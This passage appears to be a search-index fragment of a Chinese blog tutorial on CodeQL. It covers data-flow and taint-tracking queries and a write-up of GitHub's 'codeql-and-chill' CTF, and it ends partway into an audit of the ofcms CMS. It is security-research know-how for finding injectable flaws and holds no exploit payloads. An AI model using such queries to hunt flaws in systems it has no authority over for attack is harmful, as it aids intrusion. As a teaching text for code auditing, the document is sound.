\u5728DataFlow::Node\u4e2d\u6709\u4e24\u4e2a\u5173\u952e\u8c13\u8bcd\uff0c\u53ef\u4ee5\u8ba9\u6570\u636e\u6d41\u8282\u70b9\u8f6c\u4e3aExpr\u6216Parameter\u5f62\u5f0f class Node { // \u83b7\u53d6\u6570\u636e\u6d41\u8282\u70b9Expr\u7684\u5f62\u5f0f Expr asExpr() { ... } // \u83b7\u53d6\u6570\u636e\u6d41\u8282\u70b9Parameter\u7684\u5f62\u5f0f Parameter asParameter() { ... } } \u4e5f\u6709\u8c13\u8bcdexprNode\u548cparameterNode \u80fd\u628aExpr\u6216Parameter\u5f62\u5f0f\u8f6c\u6362\u4e3a\u76f8\u5e94\u7684ExprNode\u8282\u70b9ParamterNode\u8282\u70b9","title":"\u5c40\u90e8\u6570\u636e\u6d41Local data flow"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#_9","text":"\u6709\u8c13\u8bcd localFlowStep(Node nodeFrom, Node nodeTo) \uff0c\u53ef\u4ee5\u5728\u7528\u6765\u9650\u5b9a\u4ece nodeFrom \u5230 nodeTo \u7684\u6570\u636e\u6d41\uff08\u591a\u7528\u4e8ewhere\u5b50\u53e5\uff09\u3002 \u6211\u4eec\u53ef\u4ee5\u7528\u9012\u5f52\u64cd\u4f5c\u7b26+\u6216*\u6765\u9012\u5f52\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u50cf\u8fd9\u6837localFlowStep* localFlow\u76f8\u5f53\u4e8elocalFlowStep *\u3002 \u53ef\u4ee5\u7528\u5982\u4e0b\u8bed\u53e5\u6765\u9650\u5b9a\u4ecesource\u6d41\u5411sink\u7684\u6570\u636e\u6d41 DataFlow::localFlow(DataFlow::parameterNode(source), DataFlow::exprNode(sink)) \u518d\u6bd4\u5982\u8bf4\u53ef\u4ee5\u7528\u4ee5\u4e0b\u8bed\u53e5\u67e5\u8be2\u4ece\u53c2\u6570\u8282\u70b9\u5230\u8868\u8fbe\u5f0f\u8282\u70b9\u7684\u6570\u636e\u6d41","title":"\u4f7f\u7528\u5c40\u90e8\u6570\u636e\u6d41"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#local-taint-tracking","text":"\u4e3e\u4e2a\u4f8b\u5b50\uff0c\u6211\u4eec\u5728\u8ffd\u8e2a\u4e00\u4e2a\u4e0d\u5b89\u5168\u7684\u5bf9\u8c61 X\u3002 \u968f\u7740\u7a0b\u5e8f\u7684\u8fdb\u884c\uff0cX\u6765\u5230\u4e86\u8fd9\u6837\u7684\u4ee3\u7801\u4e2d\uff1a y=X+1\u3002 \u7531\u4e8ey\u662f\u7531X\u6d3e\u751f\u7684\uff0c\u5b83\u88abX\u611f\u67d3\u5f71\u54cd\u4e86\uff0c\u6240\u4ee5\u5b83\u4e5f\u5df2\u7ecf\u6210\u4e3a\u4e86\u4e00\u4e2a\u4e0d\u5b89\u5168\u7684\u5bf9\u8c61 \u4f20\u7edf\u7684\u6570\u636e\u6d41\u5206\u6790\u4f1a\u7740\u91cd\u4e8eX\u672c\u8eab\uff0c\u800c\u4e0d\u4f1a\u6ce8\u610f\u5230y\uff0c\u5b83\u53ef\u80fd\u4f1a\u53ea\u6ce8\u610fX\u6709\u53ef\u80fd\u6210\u4e3a\u54ea\u4e9b\u503c\u3002 \u800c\u6c61\u70b9\u8ddf\u8e2a\u5219\u4f1a\u5206\u6790y\uff0c\u56e0\u4e3ay\u4e5f\u88ab\u6c61\u70b9\u6240\u6c61\u67d3\u4e86\uff0c\u5206\u6790\u6c61\u70b9\u4ecex\u6d41\u5411y\u7684\u8fc7\u7a0b\u4fbf\u662f\u6c61\u70b9\u8ffd\u8e2a \u6c61\u70b9\u8ffd\u8e2a\u76f8\u5173\u5e93 import semmle.code.java.dataflow.TaintTracking \u6c61\u70b9\u8ffd\u8e2a\u5e93\u548c\u6570\u636e\u6d41\u5206\u6790\u6240\u7528\u7684\u65b9\u6cd5\u7c7b\u4f3c localTaintStep(DataFlow::Node nodeFrom, DataFlow::Node nodeTo) localTaintStep* \u5c01\u88c5\u6210\u4e86localTaint \u6211\u4eec\u5199\u4e00\u4e2ademo\u5bf9parameterNode\u5230exprNode\u7684\u6570\u636e\u6d41\u8fdb\u884c\u6c61\u70b9\u8ffd\u8e2a import java import semmle.code.java.dataflow.DataFlow import semmle.code.java.dataflow.TaintTracking from Parameter source, Expr sink where TaintTracking::localTaint(DataFlow::parameterNode(source), DataFlow::exprNode(sink)) select source,sink","title":"\u5c40\u90e8\u6c61\u70b9\u8ffd\u8e2alocal taint tracking"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#global-data-flow","text":"\u8ffd\u8e2a\u6574\u4e2a\u9879\u76ee\u4e2d\u7684\u6570\u636e\u6d41\uff0c\u6bd4\u5c40\u90e8\u6570\u636e\u6d41\u66f4\u52a0\u5f3a\u5927\u4f46\u4e5f\u66f4\u8d39\u65f6\u3002 \u8981\u4f7f\u7528\u5168\u5c40\u6570\u636e\u6d41\u8fdb\u884c\u5206\u6790\uff0c\u9700\u8981\u7528\u5230 DataFlow::Configuration \u6765\u6307\u5b9asource\u548csink\u3002 \u6211\u4eec\u5b9e\u4f8b\u5316\u4e00\u4e2a\u7ee7\u627f\u81ea\u5b83\u7684class\u5e76\u8fdb\u884c\u65b9\u6cd5\u7684\u91cd\u5199\uff0c\u540c\u65f6\u4e5f\u5199\u4e00\u4e2a\u6784\u9020\u65b9\u6cd5\u6307\u5b9a\u8fd9\u4e2aConfiguration \u7684\u540d\u5b57\uff08\u8fd9\u4e2a\u540d\u5b57\u5e94\u8be5\u662f\u552f\u4e00\u7684\uff09\u3002 import semmle.code.java.dataflow.DataFlow class MyDataFlowConfiguration extends DataFlow::Configuration { MyDataFlowConfiguration() { this = \"MyDataFlowConfiguration\" } override predicate isSource(DataFlow::Node source) { ... } override predicate isSink(DataFlow::Node sink) { ... } } \u9664\u4e86\u91cd\u5199isSource\u548cisSink\u6765\u6307\u5b9asource\u548csink\u5916\uff0c\u8fd8\u53ef\u4ee5\u9009\u62e9\u6027\u7684\u91cd\u5199isBarrier\u6765\u4e2d\u65ad\u6570\u636e\u6d41\uff0cisAdditionalFlowStep\u6765\u6dfb\u52a0\u989d\u5916\u7684\u6570\u636e\u6d41\u6b65\u9aa4\uff0c\u6216\u8005\u662f\u5ef6\u7eed\u6570\u636e\u6d41\u3002 \u968f\u540e\u7528from..where..select \u67e5\u8be2 from MyDataFlowConfiguration dataflow, DataFlow::Node source, DataFlow::Node sink where dataflow.hasFlow(source, sink) select source, \"Data flow to $@.\", sink, sink.toString()","title":"\u5168\u5c40\u6570\u636e\u6d41Global data flow"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#global-taint-tracking","text":"\u548c\u5168\u5c40\u6570\u636e\u6d41\u7c7b\u4f3c\uff0c\u53ea\u4e0d\u8fc7\u7ee7\u627f\u7c7b\u6362\u6210\u4e86 TaintTracking::Configuration","title":"\u5168\u5c40\u6c61\u70b9\u8ffd\u8e2aglobal taint tracking"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#_10","text":"codeql\u5185\u90e8\u5b9a\u4e49\u4e86\u4e00\u4e9b\u6570\u636e\u6e90\u6765\u8f85\u52a9\u5206\u6790\uff0c\u5982semmle.code.java.dataflow.FlowSources\u6a21\u5757\u4e2d\u7684 RemoteFlowSource \u7c7b\u5c31\u9884\u5b9a\u4e49\u4e86\u4e00\u4e9b\u5e38\u89c1\u7684\u7528\u6237\u8f93\u5165\u70b9\uff0c\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u62ff\u6765\u7528 override predicate isSource(DataFlow::Node source) { source instanceof RemoteFlowSource }","title":"\u6570\u636e\u6e90"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#javatype","text":"\u5728java\u5e93\u5c0f\u8282\u4e2d\u7684\u5143\u7d20\u4e00\u8282\u4e2d\u63d0\u5230\u8fc7Type\u8fd9\u4e2a\u4e1c\u897f\uff0c\u8fd9\u91cc\u66f4\u52a0\u6df1\u5165\u7684\u7406\u89e3\u8fd9\u4e2a\u4e1c\u897f\u662f\u4ec0\u4e48\u3002 Type\u5206\u4e3a\u4ee3\u8868boolen\u3001byte\u7b49\u57fa\u672c\u7c7b\u578b\u7684 PrimitiveType \u548c\u4ee3\u8868class\u3001interface\u3001array\u7b49\u7684 RefType \u3002 \u5bf9\u4e8eRefType\u6211\u4eec\u53ef\u4ee5\u7528 getASupertype \u548c getASubtype \u6765\u83b7\u53d6\u5176\u7236\u7c7b\u6216\u5b50\u7c7b\uff08extends\u548cimplement\uff09 \u4e5f\u63d0\u4f9b\u4e86 getAMember \u8fd9\u4e2a\u8c13\u8bcd\u53bb\u83b7\u53d6Type\u5185\u90e8\u6210\u5458\uff08\u5982\u5b57\u6bb5\u3001\u65b9\u6cd5\u3001\u6784\u9020\u65b9\u6cd5\uff09 \u4e5f\u63d0\u4f9b\u4e86 inherits(Method m) \u6765\u68c0\u67e5type\u5185\u90e8\u6216\u8005\u5176\u5b50\u7c7b\u91cc\u662f\u5426\u5b9a\u4e49\u4e86\u65b9\u6cd5m java\u4e2d\u5b58\u5728\u7740\u8bb8\u591a\u5f3a\u8f6c\u578b\uff0c\u4f46\u662f\u5411\u4e0b\u8f6c\u578b\u6709\u4e9b\u65f6\u5019\u662f\u5371\u9669\u7684\uff08\u5982Object\u5bf9\u8c61\u5411String\u5f3a\u8f6c\u578b\uff09\uff0c\u6211\u4eec\u8981\u60f3\u529e\u6cd5\u627e\u51fa\u6765 CastExprt \u5c31\u662f\u4e00\u4e2a\u4ee3\u8868\u5f3a\u8f6c\u578b\u7684\u8868\u8fbe\u5f0f\uff0c\u4ee3\u8868\u5982 (int) i\u8fd9\u79cd\u3002 import java from CastExpr ce, Expr source, Expr target where source.getType() = ce.getExpr().getType()and //\u5f97\u5230\u5f3a\u8f6c\u578b\u4e2d\u5c06\u8981\u88ab\u5f3a\u8f6c\u578b\u7684\u5bf9\u8c61\u7684Type\uff0c\u5982(int)i \u4e2d\u7684i target.getType() = ce.getType() and //\u5f97\u5230\u5f3a\u8f6c\u578b\u4e2d\u8f6c\u53d8\u7684\u76ee\u6807\u5bf9\u8c61\u7684Type,\u5982\uff08int\uff09i\u4e2d\u7684int target.getType().(RefType).getASupertype+() = source.getType() select ce, \"Potentially problematic array downcast.\"","title":"java\u4e2d\u7684Type"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#codeql_2","text":"","title":"Codeql \u5b9e\u64cd"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#codeql-lab-java","text":"\u7ec3\u7ec3\u624b\u5199\u4e2awp https://securitylab.github.com/ctf/codeql-and-chill/","title":"codeql lab java"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#11-sources","text":"\u5c06javax.validation.ConstraintValidator\u63a5\u53e3\u4e0bisValid\u65b9\u6cd5\u7684\u6240\u6709\u8986\u5199\u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u8bbe\u7f6e\u4e3asource predicate isSource(DataFlow::Node source) { exists(Method a| a.getASourceOverriddenMethod().hasQualifiedName(\"javax.validation\", \"ConstraintValidator\", \"isValid\") and source.asParameter()=a.getParameter(0) ) } //getASourceOverriddenMethod \u83b7\u53d6\u4e00\u4e2a\u8986\u5199\u65b9\u6cd5\u7684\u521d\u59cb\u58f0\u660e\u65b9\u6cd5 \u8fd4\u56de6\u4e2a\u7ed3\u679c","title":"1.1 :Sources"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#12-sink","text":"\u83b7\u53d6\u8c03\u7528ConstraintValidatorContext.buildConstraintViolationWithTemplate\u8fd9\u4e2a\u65b9\u6cd5\u65f6\u7684\u7b2c\u4e00\u4e2a\u4f20\u5165\u7684\u53c2\u6570 override predicate isSink(DataFlow::Node sink) { exists(Call call| call.getCallee().getQualifiedName().matches(\"ConstraintValidatorContext.buildConstraintViolationWithTemplate\") and sink.asExpr()=call.getArgument(0) ) } \u8fd4\u56de5\u4e2a\u7ed3\u679c","title":"1.2 :sink"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#13-tainttracking-configuration","text":"\u5c06\u521a\u521a\u7684source\u548csink\u6c47\u603b\u8fdb\u884c\u6c61\u70b9\u8ffd\u8e2a import java import semmle.code.java.dataflow.TaintTracking class Myconf extends TaintTracking::Configuration { Myconf() { this = \"Myconf\" } override predicate isSource(DataFlow::Node source) { exists(Method a| a.getASourceOverriddenMethod().hasQualifiedName(\"javax.validation\", \"ConstraintValidator\", \"isValid\") and source.asParameter()=a.getParameter(0) ) } override predicate isSink(DataFlow::Node sink) { exists(Call call| call.getCallee().getQualifiedName().matches(\"ConstraintValidatorContext.buildConstraintViolationWithTemplate\") and sink.asExpr()=call.getArgument(0) ) } } //There has to be a query in scope even when you use Quick Evaluation from Myconf conf,DataFlow::Node source,DataFlow::Node sink where conf.hasFlow(source, sink) select source,sink \u8fd4\u56de0\u4e2a\u7ed3\u679c","title":"1.3: TaintTracking configuration"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#14-partial-flow-to-the-rescue","text":"Partial Flow \u5728codeql\u4e2d\u7c7b\u4f3c\u4e00\u79cd\u8c03\u8bd5\u624b\u6cd5\u3002 \u6211\u4eec\u53ef\u4ee5\u7ed9\u5b9a\u4e00\u4e2a\u521d\u59cbsource\uff0c\u4ee5\u53ca\u641c\u7d22\u957f\u5ea6\uff0c\u518d\u4f7f\u7528Partial query\u5c31\u53ef\u4ee5\u63a2\u6d4b\u51fa\u8be5source\u5ef6\u7533\u6307\u5b9a\u957f\u5ea6\u6240\u5f97\u5230\u7684\u4efb\u4f55sink\u3002 \u5728\u4e0a\u4e00\u5c0f\u8282\u7684\u6d4b\u8bd5\u4e2d\u8fd4\u56de\u4e860\u6761\u7ed3\u679c\uff0c\u6211\u4eec\u63a8\u6d4b\u53ef\u80fd\u662f\u4ecesource\u5230sink\u7684\u8def\u5f84\u65ad\u5f00\u4e86\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7Partial query\u6765\u67e5\u627e\u662f\u4ece\u54ea\u91cc\u65ad\u5f00\u7684\u3002 \u8fd9\u91cc\u6211\u4eec\u8bbe\u7f6esource\u4e3ajavax.validation.ConstraintValidator \u7684isValid\u65b9\u6cd5\u4e2d\u7b2c\u4e00\u4e2a\u4e14\u540d\u4e3acontainer\u7684\u53c2\u6570\u8fdb\u884c\u67e5\u8be2\u3002 /** * @kind path-problem */ import java import semmle.code.java.dataflow.TaintTracking class Myconf extends TaintTracking::Configuration { override int explorationLimit() { result = 5 } //\u6307\u5b9a\u641c\u7d22\u957f\u5ea6 Myconf() { this = \"Myconf\" } override predicate isSource(DataFlow::Node source) { exists(Method a| a.getASourceOverriddenMethod().hasQualifiedName(\"javax.validation\", \"ConstraintValidator\", \"isValid\") and source.asParameter()=a.getParameter(0) ) } override predicate isSink(DataFlow::Node sink) { exists(Call call| call.getCallee().getQualifiedName().matches(\"ConstraintValidatorContext.buildConstraintViolationWithTemplate\") and sink.asExpr()=call.getArgument(0) ) } } //\u56fa\u5b9a\u53e5\u5f0f\uff0c\u6211\u4eec\u7ed9\u5b9a\u7684source\u662f\u540d\u4e3acontainer\u7684\u53c2\u6570\u8868\u8fbe\u5f0f from Myconf conf,DataFlow::PartialPathNode source,DataFlow::PartialPathNode sink where conf.hasPartialFlow(source, sink, _) and source.getNode().asParameter().getName()=\"container\" select source,sink \u67e5\u8be2\u7ed3\u679c\uff08\u5728\u6211\u6d4b\u8bd5\u6b64\u67e5\u8be2\u7684\u65f6\u5019\u901f\u5ea6\u5de8\u6162\uff0c\u4e0d\u77e5\u9053\u662f\u6211\u7684\u539f\u56e0\u8fd8\u662f\u4ec0\u4e48\uff09 \u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u7531\u53c2\u6570container\u5ef6\u7533\u51fa\u53bb\u7684\u6240\u6709sink\u3002","title":"1.4: Partial Flow to the rescue"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#15-adding-additional-taint-steps","text":"\u4ece\u4e0a\u4e00\u5c0f\u8282\u7684\u7ed3\u679c\u53ef\u4ee5\u770b\u51fa\uff0c\u6570\u636e\u6d41\u6839\u672c\u5c31\u6ca1\u6709\u8fdb\u5165\u5230getHardConstraints\uff0cgetSoftConstraints\uff0ckeySet\u548cHashSet\u6784\u9020\u51fd\u6570\u5185\u90e8\uff0c\u6240\u4ee5\u5c31\u9700\u8981\u6211\u4eec\u624b\u52a8\u94fe\u63a5\u8d77\u6765","title":"1.5: Adding additional taint steps"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#1617-adding-additional-taint-stepsadding-taint-steps-through-a-constructor","text":"\u6211\u4eec\u627e\u5230\u7f3a\u5931\u7684\u6570\u636e\u6d41\u8def\u5f84\u540e\u5c31\u53ef\u4ee5\u7740\u624b\u8fdb\u884c\u8fde\u63a5\u4e86\u3002 \u8981\u8fdb\u884c\u94fe\u63a5\u6211\u4eec\u9700\u8981\u5199\u4e00\u4e2a\u7ee7\u627f\u81eaTaintTracking::AdditionalTaintStep\u7684\u7c7b\u5e76\u4e14\u91cd\u5199\u5185\u90e8\u7684step\u65b9\u6cd5\u3002 \u5728step\u65b9\u6cd5\u6211\u4eec\u9700\u8981\u8bbe\u7f6e\u4e24\u4e2a\u6570\u636e\u6d41\u8282\u70b9\uff0c\u4f7f\u5176\u8fde\u63a5\u5728\u4e00\u8d77\u3002 \u4ee5getSoftConstraints\u4e3e\u4f8b \u6211\u4eec\u9700\u8981\u8bbe\u7f6enode1\u4e3acontainer\uff0cnode2\u4e3agetSoftConstraints\u7684\u8fd4\u56de\u503c\uff0c\u8fd9\u6837\u7684\u8bddgetSoftConstraints\u7684\u8fd4\u56de\u503c\u4e5f\u5c06\u6210\u4e3a\u6c61\u70b9 \u518d\u4ee5HashSet\u7684\u6784\u9020\u65b9\u6cd5\u4e3a\u4f8b\uff0c\u6211\u4eec\u9700\u8981\u8bbe\u7f6enode1\u4e3aHashSet\u521d\u59cb\u5316\u65f6\u7684\u53c2\u6570\uff0cnode2\u4e3a\u5176\u6784\u9020\u51fd\u6570\u7684\u8fd4\u56de\u503c class Fix extends TaintTracking::AdditionalTaintStep{ override predicate step(DataFlow::Node node1, DataFlow::Node node2) { exists(MethodAccess ma,Method m | (m.hasName(\"getHardConstraints\") or m.hasName(\"getSoftConstraints\") or m.hasName(\"keySet\")) and ma.getMethod()=m and node1.asExpr()=ma.getQualifier() and //getQualifier()\uff0c\u5982\u73b0\u6709\u65b9\u6cd5\u8c03\u7528 Foo.any() \u90a3\u4e48\u5bf9\u6b64\u65b9\u6cd5\u8c03\u7528\u6267\u884cgetQualifier\u5c31\u4f1a\u83b7\u5f97Foo\u8fd9\u4e2a\u8868\u8fbe\u5f0f node2.asExpr()=ma ) or exists( ConstructorCall cons| cons.getConstructor().getName().matches(\"HashSet%\") and node1.asExpr()=cons.getArgument(0) and node2.asExpr()=cons ) } }","title":"1.6&amp;1.7: Adding additional taint steps\\&amp;Adding taint steps through a constructor"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#18finish-line-for-our-first-issue","text":"\u8fd4\u56de\u4e00\u6761\u7ed3\u679c /** * @kind path-problem */ import java import semmle.code.java.dataflow.TaintTracking import DataFlow::PathGraph class Myconf extends TaintTracking::Configuration { override int explorationLimit() { result = 5 } Myconf() { this = \"Myconf\" } override predicate isSource(DataFlow::Node source) { exists(Method a| a.getASourceOverriddenMethod().hasQualifiedName(\"javax.validation\", \"ConstraintValidator\", \"isValid\") and source.asParameter()=a.getParameter(0) ) } override predicate isSink(DataFlow::Node sink) { exists(Call call| call.getCallee().getQualifiedName().matches(\"ConstraintValidatorContext.buildConstraintViolationWithTemplate\") and sink.asExpr()=call.getArgument(0) ) } } class Fix extends TaintTracking::AdditionalTaintStep{ override predicate step(DataFlow::Node node1, DataFlow::Node node2) { exists(MethodAccess ma,Method m | (m.hasName(\"getHardConstraints\") or m.hasName(\"getSoftConstraints\") or m.hasName(\"keySet\")) and ma.getMethod()=m and node1.asExpr()=ma.getQualifier() and node2.asExpr()=ma ) or exists( ConstructorCall cons| cons.getConstructor().getName().matches(\"HashSet%\") and node1.asExpr()=cons.getArgument(0) and node2.asExpr()=cons ) } } from Myconf conf,DataFlow::PathNode source,DataFlow::PathNode sink where conf.hasFlowPath(source, sink) select sink, source, sink, \"Custom constraint error message contains unsanitized user data\"","title":"1.8\uff1aFinish line for our first issue"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#3-errors-and-exceptions","text":"\u5982\u679csink\u4f20\u5165\u4e86\u9519\u8bef\u5f02\u5e38\u5904\u7406\u8bed\u53e5\u5757\u4e2d\u7684\u8bdd\uff0c\u6211\u4eec\u4e4b\u524d\u7684\u505a\u6cd5\u662f\u83b7\u53d6\u4e0d\u5230\u8fd9\u6837\u7684sink\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u6539\u8fdb\u3002 try { parse(tainted); //source:tainted } catch (Exception e) { sink(e.getMessage()) //sink:getMessage } \u6211\u4eec\u5148\u660e\u786e\u8fd9\u51e0\u4e2a\u9700\u6c42 \u5bf9\u4e8esource \u9700\u8981source\u5728try\u8bed\u53e5\u5757\u5185\u90e8\u3001\u9700\u8981\u6b64try\u8bed\u53e5\u5757\u6709\u5bf9\u5e94\u7684catch\u8bed\u53e5\u5757\u3001\u9700\u8981source\u80fd\u629b\u51fa\u9519\u8bef\u4e14\u8be5\u9519\u8bef\u80fd\u88abcatch\u6355\u83b7 \u5bf9\u4e8esink \u9700\u8981sink\u4e3a\u7279\u5b9a\u540d\u5b57\u7684\u7684\u65b9\u6cd5\u3001\u9700\u8981sink\u7684\u5b9a\u8bed\u4e3acatch\u6355\u83b7\u5230\u7684\u9519\u8bef\u5bf9\u8c61 \u76f4\u63a5copy\u7684\u5b98\u65b9wp class ExceptionTaintStep extends TaintTracking::AdditionalTaintStep { override predicate step(DataFlow::Node n1, DataFlow::Node n2) { exists(Call call, TryStmt try, CatchClause catch, MethodAccess getMessageCall | // call\u5728try\u8bed\u53e5\u5757\u5185\u90e8\uff0c\u4e14try\u6709\u5bf9\u5e94\u7684catch call.getEnclosingStmt().getEnclosingStmt*() = try.getBlock() and try.getACatchClause() = catch and // call\u629b\u51fa\u9519\u8bef\u4e14\u8be5\u9519\u8bef\u80fd\u88abcatch\u6355\u83b7 ( catch.getACaughtType().getASupertype*() = call.getCallee().getAThrownExceptionType() or catch.getACaughtType().getASupertype*() instanceof TypeRuntimeException ) and // sink\u7684\u5b9a\u8bed\u4e3acatch\u6355\u83b7\u5230\u7684\u9519\u8bef\u5bf9\u8c61 catch.getVariable().getAnAccess() = getMessageCall.getQualifier() and //sink\u4e3a\u7279\u5b9a\u540d\u5b57\u7684\u7684\u65b9\u6cd5 getMessageCall.getMethod().getName().regexpMatch(\"get(Localized)?Message|toString\") and n1.asExpr() = call.getAnArgument() and n2.asExpr() = getMessageCall ) } }","title":"3: Errors and Exceptions"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#ofcms","text":"\u770b\u7f51\u4e0a\u6709\u5206\u6790\u6587\u7ae0\uff0c\u8ddf\u7740\u641e\u4e86\u4e00\u904d ref: https://www.anquanke.com/post/id/203674#h2-9 \u8bf4\u4e86\u90a3\u4e48\u4e45ctf,\u4e0d\u6765\u70b9\u5b9e\u6218\u5b9e\u5728\u662f\u4e0d\u7ed9\u52b2\uff0c\u5ba1\u5ba1\u8fd9\u4e2a\u73a9\u73a9 \u5148\u6765\u770b\u770bofcms\u7684\u6280\u672f\u6808 \u53d1\u73b0\u4f7f\u7528\u5230\u4e86jfinal\u8fd9\u4e2aMVC web\u6846\u67b6\u3002 \u90a3\u4e48ofcms\u4e5f\u5c31\u662fMVC\u67b6\u6784\u4e86\u3002\u6211\u4eec\u5148\u6765\u5173\u6ce8\u4e00\u4e0b\u5b83\u7684controller\u3002 \u56e0\u4e3aofcms\u7528\u5230\u4e86jfinal\u6846\u67b6\uff0c\u6240\u4ee5\u6211\u4eec\u5148\u770b\u4e0bjfinal\u6846\u67b6\u4e2d\u7684controller\uff1a com.jfinal.core.Controller \u4ece\u7c7b\u578b\u7ed3\u6784\u53ef\u77e5ofcms\u7684\u6240\u6709controller\u90fd\u7ee7\u627f\u81eajfinal\u7684Controller\u3002 \u6211\u4eec\u53ef\u4ee5\u62ff\u8fd9\u4e9bcontroller\u7684getter\u65b9\u6cd5\u7684\u88ab\u8c03\u7528\u70b9\u4e3asource\u3002 \u5206\u6790\u4e86\u4e00\u4e0b\uff0c\u9009\u4e86\u8fd9\u51e0\u4e2aController com.jfinal.core.Controller\u3001com.ofsoft.cms.front.controller.BaseController\u3001com.ofsoft.cms.api.ApiBase\u4ee5\u53cacom.ofsoft.cms.admin.controller\u4e0b\u6240\u6709\u4ee5Controller\u7ed3\u5c3e\u7684class class ControllerGetter extends MethodAccess{ ControllerGetter(){ ( this.getMethod().getDeclaringType*().getQualifiedName().matches(\"com.ofsoft.cms.front.controller.BaseController\") and 